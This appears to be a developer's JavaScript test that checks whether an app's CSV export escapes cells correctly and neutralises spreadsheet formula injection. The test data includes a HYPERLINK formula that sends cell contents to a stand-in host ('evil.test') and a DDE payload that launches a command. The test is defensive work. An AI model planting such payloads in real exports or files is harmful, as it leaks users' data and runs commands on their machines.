import { freshClient, init } from './lib.mjs'
const conn = freshClient('/home/user/Testing/.di-tmp/db5')
await init(conn)

// verbatim from src/app/api/export/route.ts
function csvCell(value) {
  if (value == null) return ''
  const s = String(value)
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
}
function toCsv(rows) {
  if (!rows.length) return ''
  const headers = Object.keys(rows[0])
  const lines = [headers.join(',')]
  for (const row of rows) lines.push(headers.map((h) => csvCell(row[h])).join(','))
  return `﻿${lines.join('\r\n')}\r\n`
}

await conn.execute({ sql: `INSERT INTO sessions (id, code, name, created_at, config) VALUES (?,?,?,?,?)`, args: ['S1','V01','Vidhi',1000,'{}'] })
const answers = [
  'careful, kind',                       // comma
  'they call me "steady"',               // quote
  'line one\nline two',                  // newline
  '=1+1',                                // leading =
  '=HYPERLINK("http://evil.test?d="&A1,"click")',
  '+1-555-0100',
  '@SUM(A1:A9)',
  '-2+3',
  '\t=cmd|\'/c calc\'!A1',
]
let i = 0
for (const t of answers) {
  await conn.execute({ sql: `INSERT INTO attributes (id,session_id,text,dimension,prompt,round,written_at,side,x,y) VALUES (?,?,?,?,?,?,?,?,?,?)`,
    args: [`a${i++}`, 'S1', t, 'values', 'p', 0, i, 'ys', 1, 2] })
}
const res = await conn.execute(`
    SELECT s.code, s.name, s.created_at AS session_created_at, s.end_reason, s.duration_ms,
           a.id AS attribute_id, a.text, a.dimension, a.prompt, a.round,
           a.written_at, a.side, a.transferred_at, a.transferred_by, a.x, a.y
    FROM attributes a JOIN sessions s ON s.id = a.session_id
    ORDER BY s.created_at DESC, a.written_at ASC`)
const rows = res.rows
console.log('Object.keys(row[0]) =', JSON.stringify(Object.keys(rows[0])))
const csv = toCsv(rows)
console.log('--- csv ---'); console.log(JSON.stringify(csv))
// parse it back with a strict RFC4180 parser to see whether the quoting round-trips
function parseCsv(s) {
  s = s.replace(/^﻿/, '')
  const out = []; let row = []; let cell = ''; let q = false
  for (let i = 0; i < s.length; i++) {
    const c = s[i]
    if (q) { if (c === '"') { if (s[i+1] === '"') { cell += '"'; i++ } else q = false } else cell += c }
    else if (c === '"') q = true
    else if (c === ',') { row.push(cell); cell = '' }
    else if (c === '\r' && s[i+1] === '\n') { row.push(cell); out.push(row); row = []; cell = ''; i++ }
    else cell += c
  }
  if (cell || row.length) { row.push(cell); out.push(row) }
  return out
}
const parsed = parseCsv(csv)
const ti = parsed[0].indexOf('text')
console.log('\nround-trip of the text column:')
let bad = 0
parsed.slice(1).forEach((r, n) => {
  const ok = r[ti] === answers[n]
  if (!ok) bad++
  console.log(ok ? '  ok  ' : '  BAD ', JSON.stringify(r[ti]), 'vs', JSON.stringify(answers[n]))
})
console.log('round-trip failures:', bad)
console.log('\ncells Excel/Sheets would evaluate as a formula:',
  parsed.slice(1).map(r => r[ti]).filter(t => /^[=+\-@\t\r]/.test(t)).length)
